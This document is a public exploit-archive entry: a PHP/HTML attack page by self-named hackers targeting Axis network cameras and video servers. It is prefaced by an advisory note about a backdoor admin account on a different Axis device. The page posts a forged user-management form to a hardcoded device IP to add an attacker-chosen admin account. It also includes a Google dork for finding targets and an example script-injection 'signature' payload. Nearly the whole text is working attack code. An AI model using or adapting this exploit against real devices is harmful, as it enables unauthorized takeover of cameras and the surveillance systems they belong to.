source: http://www.securityfocus.com/bid/11011/info

A hardcoded backdoor administrative-user issue allows remote attackers to administer affected devices. This likely cannot be disabled.
 
This issue is reported to affect:
- Axis StorePoint CD E100 CD-ROM Server with firmware version 5.30
 
<?php
###########################################################################
#          03/11/2007 | 3:00        #
#    |#|axisNC.php        #
#          |#|Axis Network Camera HTTP Authentication Bypass|#|
#
#                          Exploit:        #
#              plz help as friend to ours new project iam or maroc 
telecom
                      company                                    #
#                         By  ConcorDHacK and xcoder            #
#                    moroccan-hackers-sabotage.co.ma                      
#
#|    Remplace [IP]or[Hostname] by onother IP or Hostname    #
#          |#|Affected Products|#|       #
#           #
# AXIS 2100 Network Camera versions 2.32 and previous    #
# AXIS 2110 Network Camera versions 2.32 and previous    #
# AXIS 2120 Network Camera versions 2.32 and previous    #
# AXIS 2130 PTZ Network Camera versions 2.32 and previous    #
# AXIS 2400 Video Server versions 2.32 and previous    #
# AXIS 2401 Video Server versions 2.32 and previous    #
# AXIS 2420 Network Camera versions 2.32 and previous    #
# AXIS 2460 Network DVR versions 3.00 and previous    #
# AXIS 250S Video Server versions 3.02 and previous    #
# i know this exploit its old but the new is if add new password
         this password give you ftp access
!!!!!!!!!!!!!!!!!!!!!!!!!          #
#    |#|Google dork : intitle:"Axis 2100 Network Camera" ....       #
#           #
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 2);
ob_implicit_flush (1);
?>
<style
type="text/css">body{background-color:black; 
SCROLLBAR-ARROW-COLOR:#ffffff;
SCROLLBAR-BASE-COLOR: black; color:   red; } img 
{background-color:#FFFFFF}
input  {background-color:black} option{ background-color: black}   
textarea
{background-color: black } input {color: red } option {color: red 
}textarea
{color: red }checkbox{background-color: black }select {font-weight:
normal;
color:
#1CB081;background-color:black;}body{font-size:8pt;background-color:
black;body * {font-size: 8pt } h1 {font-size:0.8em }h2{font-size:0.8em}  
h3
{font-size: 0.8em} h4,h5,h6{font-size:0.8em}h1 font{font-size:0.8em}h2 
font
{font-size:0.8em } h3 font {font-size:  0.8em}h4 font,h5  font,h6      
font
{font-size:  0.8em } *  {font-style:  normal }    *{text-decoration: 
none }
a:link,a:active,a:visited{ text-decoration: none ; color : black; } 
a:hover
{text-decoration: underline;color : black; } .Stile5 {font-family: 
Verdana,
Arial, Helvetica,  sans-serif;  font-size: 10px; }  .Stile6   
{font-family:
Verdana,  Arial,  Helvetica,     sans-serif;font-weight:bold;   
font-style:
italic;}--></style>
<script LANGUAGE="JavaScript">
var password = new Array(20)
function formatPassword(pwString)
{
var code
var pwCoded = ""
for (var i=0; i<pwString.length; i++) {
code = pwString.charCodeAt(i)
if (code < 10)
pwCoded += "00" + code
else if (code < 100)
pwCoded += "0" + code
else
pwCoded += code
}
return pwCoded
}
function parseUsers()
{
var form = document.WizardForm
var list = form.users
var str = form.conf_Security_List.value
var name
var rights
var pwCoded
var pwString
var noOfUsers = 0
var index = str.indexOf(":")
list.length = 0
while (!(index == -1)) {
name = str.substr(0,index)
str = str.substr(index+1, str.length-index-1)
index = str.indexOf(":")
rights = str.substr(0,index)
str = str.substr(index+1, str.length-index-1)
index = str.indexOf(":")
pwCoded = str.substr(0,index)
str = str.substr(index+1, str.length-index-1)
pwString = ""
list.length++
list.options[noOfUsers].value = name
if (rights.length > 0)
list.options[noOfUsers].text = name + ":" + rights
else
list.options[noOfUsers].text = name
password[noOfUsers] = pwString
noOfUsers++
index = str.indexOf(":")
}
}
function formatUsers()
{
var form = document.WizardForm
var list = form.users
var str = ""
for (var i=0; i<list.length; i++) {
str = str + list.options[i].text
if (isAdmin(i) || isView(i) || isDial(i))
str += ":"
else
str += "::"
str +=  formatPassword(password[i]) + ":"
}
form.conf_Security_List.value = str
}
function contains(ch, index)
{
var form = document.WizardForm
var list = form.users
var text = list.options[index].text
var lenValue = list.options[index].value.length
var lenText  = text.length
if (lenValue == lenText) {
return false  // No user rights
} else {
for (var i=lenValue+1; i<lenText; i++) {
if (text.charAt(i) == ch) {
return true
}
}
return false
}
}
function isAdmin(index)
{
return contains("A", index)
}
function isView(index)
{
return contains("V", index)
}
function isDial(index)
{
return contains("D", index)
}
function UserChange()
{
var form = document.WizardForm
var list = form.users
var index = list.selectedIndex
form.username.value = list.options[index].value
form.password1.value = password[index]
form.password2.value = password[index]
form.checkAdmin.checked = isAdmin(index)
form.checkDial.checked = isDial(index)
form.checkView.checked = isView(index)
}
function deleteUser()
{
var list = document.WizardForm.users
if ((list.selectedIndex != -1) &&
(list.options[list.selectedIndex].text.substr(0,4)
== "root")) {
alert("The 'root' user cannot be deleted.")
} else if (!(list.selectedIndex == -1)) {
for (var i = list.selectedIndex; i<list.length-1 ; i++) {
list.options[i].text = list.options[i+1].text
list.options[i].value = list.options[i+1].value
password[i] = password[i+1]
}
list.length--
}

if (list.selectedIndex == -1)
list.selectedIndex = list.length-1
UserChange()
}
function addUserButton()
{
addUser(false)  // false means that an empty user is not accepted
}
function addUser(ignoreEmptyUser)
{
var form = document.WizardForm
var list = form.users
var newUser
var index = -1
if ((ignoreEmptyUser) && (form.username.value == ""))
return 1
if (list.length == 20) {
alert("It is not possible to add more than 20 users.")
form.username.select()
form.username.focus()
return 0
}
if (list.length == 1 && list.options[0].value == "")
index = 0
else {
for (var i = 0; i<list.length ; i++) {
if (list.options[i].value == form.username.value)
index = i
}
}
newUser = (index == -1)
if ((checkUserName() == 1) && (checkPasswords(newUser) == 1) &&
(checkRights() == 1)) {
if (newUser) {
index = list.length
list.length++
}
list.options[index].value = form.username.value
list.options[index].text = form.username.value + strRights()
password[index] = form.password1.value
} else {
return 0
}
list.selectedIndex = index
return 1
}
function clearUser()
{
var form = document.WizardForm
form.username.value = ""
form.password1.value = ""
form.password2.value = ""
}
function strRights()
{
var form = document.WizardForm
var str = ":"
if (!(form.checkAdmin.checked || form.checkDial.checked ||
form.checkView.checked))
return ""
if (form.checkAdmin.checked)
str += "A"
if (form.checkDial.checked)
str += "D"
if (form.checkView.checked)
str += "V"
return str
}
function checkUserName()
{
var form = document.WizardForm
var aName = form.username.value
var c
for (var i = 0; i < aName.length; i++)
{
c = aName.charAt(i)
}
return 1
}
function checkPasswords(newUser)
{
var form = document.WizardForm
var aPass1 = form.password1.value
var aPass2 = form.password2.value
var c
return 1
}
function checkRights()
{
var form = document.WizardForm
var aAdmin = form.checkAdmin
var aDial = form.checkDial
var aView = form.checkView
if (!(aAdmin.checked || aDial.checked || aView.checked)) {
alert("Select User Rights before adding user.")
aAdmin.focus()
aAdmin.select()
return 0
}
return 1
}
//-->
</script>
<script LANGUAGE="JavaScript">
<!--
function onLoad()
{
parseUsers()
}
function saveData()
{
var form = document.WizardForm
if (addUser(true) == 1) {  // true means "ignore empty user"
formatUsers()
form.submit()
}
}
//-->
</script>
</HEAD>
<BODY BGCOLOR="black" LINK="gray" VLINK="gray" ALINK="gray"
ONLOAD="onLoad()">
<TABLE BORDER="0" WIDTH="1100" HEIGHT="400" CELLSPACING="0" 
CELLPADDING="0">
<TR><TD COLSPAN="2">




<FORM ACTION="http://194.168.163.96//this_server/ServerManager.srv"
METHOD="POST" NAME="WizardForm">




<TABLE BORDER="0" CELLSPACING="0" CELLPADDING="0">
<TR><TD COLSPAN="2">
<INPUT TYPE="hidden" NAME="conf_Security_List" VALUE="root:ADVO::">
<FONT FACE="ARIAL, GENEVA" SIZE="2"><B>A script By ConcorDHacK <br><a 
href="
http://www.hackzord-security.fr.tc"><font color="red"><i><u>[
www.hackzord-security.fr.tc]</a></B></FONT>
</TD><BR><BR></TR><TR><TD COLSPAN="2"><FONT FACE="Arial, Geneva"
SIZE="2"><SELECT NAME="users" SIZE="2" onchange="UserChange()">
<OPTION value="Dummy">WWWWWWWWWW:ADV
</SELECT></FONT></TD><TD></TD><TR><TD 
COLSPAN="2"></TD><TD></TD></TR><TR><TD
COLSPAN="4"><HR></TD></TR><TR><TD><FONT FACE="Arial, Geneva" 
SIZE="2"><b>New
Admin:</FONT></TD>
<TD><FONT FACE="Arial, Geneva" SIZE="2"><INPUT name="username" 
type="text"
size="30"> (Ex : ConcorDHacK or just root)</FONT></TD>
</TR><TR><TD><FONT FACE="Arial, Geneva"
SIZE="2"><b>Password:</FONT></TD><TD><FONT FACE="Arial, Geneva"
SIZE="2"><INPUT name="password1" type="password" size="30">
Password of your choice (Ex : 123456 )</FONT></TD>
</TR><TR><TD><FONT FACE="Arial, Geneva" SIZE="2"><b>Verify:</FONT></TD>
<TD><FONT FACE="Arial, Geneva" SIZE="2"><INPUT name="password2"
type="password" size="30"> Confirm your password</FONT></TD>
</TR><TR><TD><FONT FACE="Arial, Geneva" 
SIZE="2"><b>Signature:</FONT></TD>
<TD><FONT FACE="Arial, Geneva" SIZE="2"><INPUT name="conf_Image_UseText"
type="text" size="30" value=""> Your signature in the administration by
HTML/Javascript code  after "> (Ex : ">
<script>alert("LOL")</script></pre></FONT></TD>
</TR><TR><TD><FONT FACE="Arial, Geneva" SIZE="2"><b>User Rights:
</FONT></TD><TD><FONT FACE="Arial, Geneva" SIZE="2"><INPUT 
NAME="checkAdmin"
TYPE="checkbox"><b>Admin
<TR><TD></TD><TD><FONT FACE="Arial, Geneva" SIZE="2"><INPUT 
NAME="checkDial"
TYPE="checkbox"><b> Dial-in </TD></TR></font><TR><TD></TD><TD><FONT
FACE="Arial, Geneva" SIZE="2">
<INPUT NAME="checkView" TYPE="checkbox"><b> View
</TD></TR></FONT></TD></TR><TR><TD COLSPAN="2" ALIGN="center"><br>
<table border="0" cellspacing="1" cellpadding="1"
width="300"bgcolor="#ffffff"><tr><td bgcolor="red" width="20%"
height="16"><center><b><font color="black"><A
HREF="javascript:saveData()">-=[Go!Go!]=-</A></font></td>
</TD></TR></TABLE><INPUT TYPE="HIDDEN" NAME="servermanager_return_page"
VALUE="/admin/setgen/security.shtml">
<INPUT TYPE="HIDDEN" NAME="servermanager_do"
VALUE="set_variables"></FORM></TD></TR></TABLE></BODY></HTML> 